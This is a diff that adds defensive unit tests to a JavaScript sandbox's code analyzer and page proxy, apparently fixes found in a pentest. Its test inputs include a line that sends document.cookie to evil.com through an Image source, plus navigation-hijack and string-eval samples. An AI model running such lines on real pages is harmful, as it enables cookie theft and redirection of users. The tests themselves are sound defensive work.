@@ -417,6 +417,133 @@ describe('analyzeCode', () => {
     });
   });
 
+  // ── v3: pentest fixes ──
+
+  describe('v3: pentest fixes', () => {
+    it('blocks createElement("script")', () => {
+      const result = analyzeCode("document.createElement('script')");
+      expect(result.safe).toBe(false);
+      expect(result.reason).toContain('element creation');
+    });
+
+    it('still blocks createElement("iframe")', () => {
+      const result = analyzeCode("document.createElement('iframe')");
+      expect(result.safe).toBe(false);
+      expect(result.reason).toContain('element creation');
+    });
+
+    it('allows createElement("div")', () => {
+      expect(analyzeCode("document.createElement('div')")).toEqual({ safe: true });
+    });
+
+    it('blocks Object.getOwnPropertyDescriptors (plural)', () => {
+      const result = analyzeCode("Object.getOwnPropertyDescriptors(window)");
+      expect(result.safe).toBe(false);
+      expect(result.reason).toContain('descriptor');
+    });
+
+    it('still blocks Object.getOwnPropertyDescriptor (singular)', () => {
+      const result = analyzeCode("Object.getOwnPropertyDescriptor(window, 'fetch')");
+      expect(result.safe).toBe(false);
+      expect(result.reason).toContain('descriptor');
+    });
+
+    it('blocks javascript: string literal', () => {
+      const result = analyzeCode("location.href = 'javascript:void(0)'");
+      expect(result.safe).toBe(false);
+      expect(result.reason).toContain('javascript:');
+    });
+
+    it('blocks javascript: with leading whitespace', () => {
+      const result = analyzeCode("location.href = '  javascript:alert(1)'");
+      expect(result.safe).toBe(false);
+      expect(result.reason).toContain('javascript:');
+    });
+
+    it('allows regular string literals', () => {
+      expect(analyzeCode("const x = 'hello world'")).toEqual({ safe: true });
+    });
+
+    it('blocks new Image()', () => {
+      const result = analyzeCode("new Image()");
+      expect(result.safe).toBe(false);
+      expect(result.reason).toContain('constructor');
+    });
+
+    it('blocks new Image() with src exfiltration', () => {
+      const result = analyzeCode("new Image().src = 'https://evil.com/?' + document.cookie");
+      // cookie access or Image constructor — either blocks it
+      expect(result.safe).toBe(false);
+    });
+
+    it('blocks setTimeout with template literal', () => {
+      const result = analyzeCode('setTimeout(`alert(1)`, 100)');
+      expect(result.safe).toBe(false);
+      expect(result.reason).toContain('setTimeout');
+    });
+
+    it('blocks setInterval with template literal', () => {
+      const result = analyzeCode('setInterval(`doStuff()`, 1000)');
+      expect(result.safe).toBe(false);
+      expect(result.reason).toContain('setInterval');
+    });
+
+    it('still allows setTimeout with function arg', () => {
+      expect(analyzeCode('setTimeout(() => {}, 0)')).toEqual({ safe: true });
+    });
+  });
+
+  // ── v3: live pentest Tier 1 fixes ──
+
+  describe('v3: live pentest Tier 1 fixes', () => {
+    it('blocks new Worker()', () => {
+      const result = analyzeCode("new Worker('data:text/javascript,self.postMessage(1)')");
+      expect(result.safe).toBe(false);
+      expect(result.reason).toContain('constructor');
+    });
+
+    it('blocks new SharedWorker()', () => {
+      const result = analyzeCode("new SharedWorker('/worker.js')");
+      expect(result.safe).toBe(false);
+      expect(result.reason).toContain('constructor');
+    });
+
+    it('blocks new RTCPeerConnection()', () => {
+      const result = analyzeCode("new RTCPeerConnection({iceServers: []})");
+      expect(result.safe).toBe(false);
+      expect(result.reason).toContain('constructor');
+    });
+
+    it('blocks location.assign()', () => {
+      const result = analyzeCode("location.assign('https://evil.com')");
+      expect(result.safe).toBe(false);
+      expect(result.reason).toContain('Navigation hijack');
+    });
+
+    it('blocks location.replace()', () => {
+      const result = analyzeCode("location.replace('https://evil.com')");
+      expect(result.safe).toBe(false);
+      expect(result.reason).toContain('Navigation hijack');
+    });
+
+    it('allows location.href read (not a blocked call)', () => {
+      expect(analyzeCode('location.href')).toEqual({ safe: true });
+    });
+
+    it('includes Worker/SharedWorker/RTCPeerConnection in page proxy blocked set', () => {
+      const wrapped = wrapWithPageProxy('1');
+      expect(wrapped).toContain('"Worker"');
+      expect(wrapped).toContain('"SharedWorker"');
+      expect(wrapped).toContain('"RTCPeerConnection"');
+    });
+
+    it('includes location sub-proxy rules', () => {
+      const wrapped = wrapWithPageProxy('1');
+      expect(wrapped).toContain('"assign"');
+      expect(wrapped).toContain('"replace"');
+    });
+  });
+
   // ── Edge cases ──
 
   describe('edge cases', () => {
@@ -564,6 +691,27 @@ describe('wrapWithPageProxy', () => {
     const wrapped = wrapWithPageProxy('1');
     expect(wrapped).toContain('new Proxy(window');
     expect(wrapped).toContain('[secure_eval] Blocked:');
+  });
+
+  it('includes getOwnPropertyDescriptor trap', () => {
+    const wrapped = wrapWithPageProxy('1');
+    expect(wrapped).toContain('getOwnPropertyDescriptor');
+  });
+
+  it('includes ownKeys trap', () => {
+    const wrapped = wrapWithPageProxy('1');
+    expect(wrapped).toContain('ownKeys');
+  });
+
+  it('includes Image in blocked set', () => {
+    const wrapped = wrapWithPageProxy('1');
+    expect(wrapped).toContain('"Image"');
+  });
+
+  it('blocks document.write and writeln in sub-proxy rules', () => {
+    const wrapped = wrapWithPageProxy('1');
+    expect(wrapped).toContain('"write"');
+    expect(wrapped).toContain('"writeln"');
   });
 });
 
